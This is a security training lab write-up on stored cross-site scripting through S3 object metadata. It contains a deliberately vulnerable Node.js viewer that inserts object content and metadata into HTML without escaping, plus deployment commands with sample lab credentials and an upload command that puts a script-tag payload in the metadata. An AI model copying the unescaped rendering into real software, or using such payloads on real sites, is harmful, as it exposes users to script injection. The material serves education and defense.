# 10. Stored XSS via S3 Object Metadata  

## Goals

The goal of this lab is to demonstrate the interactions between the S3 objects and its metadata with applications which purposes are to manipulate objects and their metdata and interprete their contents.
Even though S3 engines are not intented to process the content of objects data and metadata, buckets can serve as repository for malwares and vectors for traditional attacks.

Here we will more especially demonstrate how can a Web app that is intended to display the content of text files and the objecvt metadata in buckets can be vulnerable to stored Cross Site Scripting (XSS)


<br>

---

<br>

## Disclaimer

This application is **intentionally vulnerable** and must be used **only for security research, education, and defensive testing in a lab environment**.

<br>
---

<br>

## 1. Architecture Overview


<br>

```yaml
+---------+            +-------------------+            +--------------------+            +-----------+
| Browser |            |       BIG-IP      |            |   Vulnerable Web   |            |  MinIO    |
| Client  |    HTTPS   |   (LTM + A.WAF)   |    HTTPS   |    Application     |   HTTPS    |  Server   |
|         |----------->|                   |----------->|                    |----------->|           |
|         |            |                   |            | (vulnerable to XSS)|            |  stored   |
|         |            |                   |            |                    |            |    XSS    |
+---------+            +-------------------+            +--------------------+            +-----------+

```

<br>
---

<br>

## 2. Vulnerable Web Application

### 2.1 Application behavior

The web application displays a form with:
  - Bucket name input
  - Object name input

The app uses **admin-level S3 credentials**

When the user enters a bucket and an object, the Web App retrieves the object and its metadata and display them:
  - Object content (if text)
  - Object metadata (unsanitized)

Because the metadata are not controlled within the app, it is **vulnerable to stored XSS** via metadata

<br>
---

### 2.2. Environment Variables

The application **requires** the following environment variables:

<br>

| Variable | Description |
|--------|------------|
| `S3_ENDPOINT` | MinIO/S3 endpoint (IP:PORT) |
| `S3_ACCESS_KEY` | Admin access key |
| `S3_SECRET_KEY` | Admin secret key |
| `S3_REGION` | Region (default: us-east-1) |

<br>


### 2.3. Project Files Structure

<br>

```yaml
├── Dockerfile
├── package.json
└── server.js
```


<br>

**server.js**

```js
const express = require('express');
const AWS = require('aws-sdk');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));

const s3 = new AWS.S3({
  endpoint: process.env.S3_ENDPOINT,
  accessKeyId: process.env.S3_ACCESS_KEY,
  secretAccessKey: process.env.S3_SECRET_KEY,
  region: process.env.S3_REGION || 'us-east-1',
  s3ForcePathStyle: true,
  signatureVersion: 'v4'
});

app.get('/', (req, res) => {
  res.send(`
    <html>
    <head>
      <title>S3 File Viewer</title>
    </head>
    <body>
      <h1>S3 File Viewer</h1>

      <form method="POST" action="/fetch">
        <label>Bucket Name:</label><br/>
        <input type="text" name="bucket" /><br/><br/>

        <label>Object Name:</label><br/>
        <input type="text" name="object" /><br/><br/>

        <button type="submit">Submit</button>
      </form>
    </body>
    </html>
  `);
});

app.post('/fetch', async (req, res) => {
  const bucket = req.body.bucket;
  const object = req.body.object;

  try {
    const head = await s3.headObject({
      Bucket: bucket,
      Key: object
    }).promise();

    const data = await s3.getObject({
      Bucket: bucket,
      Key: object
    }).promise();

    const body = data.Body.toString('utf-8');

    let metadataHtml = '';
    for (const key in head.Metadata) {
      metadataHtml += `<li>${key}: ${head.Metadata[key]}</li>`;
    }

    res.send(`
      <html>
      <head>
        <title>Object Viewer</title>
      </head>
      <body>
        <h2>Object Content</h2>
        <pre>${body}</pre>

        <h2>Object Metadata</h2>
        <ul>
          ${metadataHtml}
        </ul>

        <a href="/">Back</a>
      </body>
      </html>
    `);

  } catch (err) {
    res.send(`
      <html>
      <body>
        <h2>Error</h2>
        <pre>${err.message}</pre>
        <a href="/">Back</a>
      </body>
      </html>
    `);
  }
});

app.listen(3000, () => {
  console.log('Vulnerable portal listening on port 3000');
});
```

<br>

**package.json**

```json
{
  "name": "s3-xss-demo",
  "version": "1.0.0",
  "main": "server.js",
  "dependencies": {
    "aws-sdk": "^2.1580.0",
    "body-parser": "^1.20.2",
    "express": "^4.18.2"
  }
}
```

<br>

**Dockerfile**

```dockerfile
FROM node:18-alpine

WORKDIR /app

COPY package.json .
RUN npm install

COPY server.js .

EXPOSE 3000

CMD ["node", "server.js"]
```

## Run the demo

Start by building the Container with the desired environment variables so it matches your lab

```bash
MINIO_101="10.1.10.101:9000"
MINIO_ACCESS_KEY="admin"
MINIO_SECRET_KEY="myPass12345"


docker build -t s3-xss-demo .

docker run -d --restart unless-stopped \
  -p 3000:3000 \
  -e S3_ENDPOINT=http://$MINIO_101 \
  -e S3_ACCESS_KEY=$MINIO_ACCESS_KEY \
  -e S3_SECRET_KEY=$MINIO_SECRET_KEY \
  -e S3_REGION=us-east-1 \
  s3-xss-demo

```

<br>

Then upload a Malicious Object to the bucket

```shell
echo "This object is safe but should be scared about its metadata" > /tmp/test.txt
mc mb minio-101/files
mc cp /tmp/test.txt minio-101/files --attr "description=<script>alert(1)</script>"
```  

Finally, you can trigger the vulnerability by opening a browser to http://localhost:3000 on the client to browse the vulnerable web application. You can also use the UDF access to **S3_object_browser** on the client.

  Bucket: **files**
  Object: **test.txt**

then click Submit

You should see the object content being displayed on the page and, since the metadata is rendered as HTML, the stored XSS is triggered

<br><br>
<p align="center">
	<img width="800" src="https://github.com/f5devcentral/S3--EMEA-AI-Trainings--101-Hands-on-Lab/blob/main/docs/xss_s3.jpg?raw=true" alt="UDF S3 Topo">
</p>
<br>

## Key Takeway / BIG-IP Mitigation

Metadata is oftenly treated as trusted cause it is just static headers and description.
S3 is rarely behind a WAF because since the payload is Canonically hashed it is not interpretable by any WAF.
But, you need to make sure that all applications that are consuming objects contents and especially their metadata are protected.



<br><br>

---

<br><br>
[Back to Agenda](/README.md)


